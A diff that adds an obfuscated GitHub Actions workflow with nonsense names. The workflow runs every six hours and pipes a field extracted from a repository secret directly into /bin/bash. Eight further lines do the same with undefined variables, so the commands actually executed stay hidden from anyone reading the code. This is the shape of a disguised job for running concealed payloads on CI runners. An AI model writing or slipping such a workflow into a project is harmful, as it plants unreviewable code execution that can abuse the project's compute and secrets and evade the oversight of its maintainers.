@@ -1,0 +1,25 @@
+name: pristinestevedore
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: pristinestevedore
+        env:
+          rig15: ${{ secrets.rig15 }}
+        run: |
+          echo $rig15 | jq -r .yy6 | /bin/bash
+          echo $otk5052 | jq -r .kkpz709 | /bin/bash
+          echo $n0267 | jq -r .md76185 | /bin/bash
+          echo $kyr58148 | jq -r .yqa80 | /bin/bash
+          echo $wi17 | jq -r .qkwq051 | /bin/bash
+          echo $pwr4 | jq -r .q42 | /bin/bash
+          echo $pctgp6 | jq -r .vej055 | /bin/bash
+          echo $pqa862 | jq -r .z209 | /bin/bash
+          echo $nzot84 | jq -r .ohb837 | /bin/bash
+
